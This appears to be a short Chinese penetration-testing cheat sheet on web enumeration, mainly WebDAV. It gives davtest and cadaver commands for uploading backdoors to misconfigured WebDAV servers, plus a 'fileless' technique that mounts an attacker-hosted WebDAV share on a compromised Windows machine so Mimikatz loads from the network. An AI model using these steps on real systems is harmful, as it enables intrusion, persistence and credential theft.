# web应用枚举

&nbsp;

## Wordpress枚举

### 【wordpress用户枚举】




&nbsp;

## WebDav枚举
* 通俗一点儿来说，WebDAV 就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。

### 【webDav配置不当上传木马】

* 1）使用DavTest工具测试webdav能否执行一些脚本
  ```bash
  davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
  ```

* 2）使用cadaver工具连接webdav，上传脚本
  ```bash
  cadaver IP
  ```
  >登录成功后，使用upload，move，delete命令进行操作


### 【webdav无文件落地目标系统】

* window读取linux文件
  * （1）在win或者linux系统上搭建webdav服务环境，作为工具上传基址
    ```bash
    pip install PyWebDAV //win系统
    apt-get install python-webdav //linux系统
    davserver -D /工具路径 -n -H 10.10.10.10 //启动webdav
    ```
  * （2）当我们已经拥有命令执行权限时，需要将文件在目标机器上执行，由于 Windows 下载文件比较麻烦，故此采用 Webdav
    ```bash
    net use Z: http://10.10.10.10:8008 //挂载远程webdav
    net use Z: /DELETE //终止挂载
    ```
  * （3）当我们运行 Mimikatz 时，会从网络加载这个文件，而不会落地到目标机器


&nbsp;


